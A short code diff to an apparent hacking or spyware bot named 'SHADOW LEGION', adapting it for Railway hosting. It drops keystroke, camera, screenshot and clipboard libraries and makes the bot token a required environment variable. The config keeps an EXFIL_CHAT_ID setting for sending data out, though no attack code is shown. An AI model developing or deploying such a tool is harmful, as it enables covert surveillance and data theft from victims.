@@ -2,7 +2,9 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 SHADOW LEGION v105.0 – معدل للعمل على Railway (بدون أدوات اختراق غير مدعومة)
+🔥 SHADOW LEGION v105.0 – معدل للعمل على Railway
+تم حذف المكتبات غير المدعومة (pynput, opencv, mss, pyperclip)
+وتعديل دوال الأدوات لترجع رسائل "غير مدعوم" بدلاً من التعطل.
 """
 
 import os
@@ -44,7 +46,10 @@ import psutil
 from cryptography.fernet import Fernet
 
 # ====================== CONFIG ======================
-TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
+TOKEN = os.environ.get("TOKEN")
+if not TOKEN:
+    raise ValueError("❌ TOKEN environment variable not set")
+
 EXFIL_CHAT_ID = os.environ.get("EXFIL_CHAT_ID", "")
 DEFAULT_REGION = "europe-west1"
 
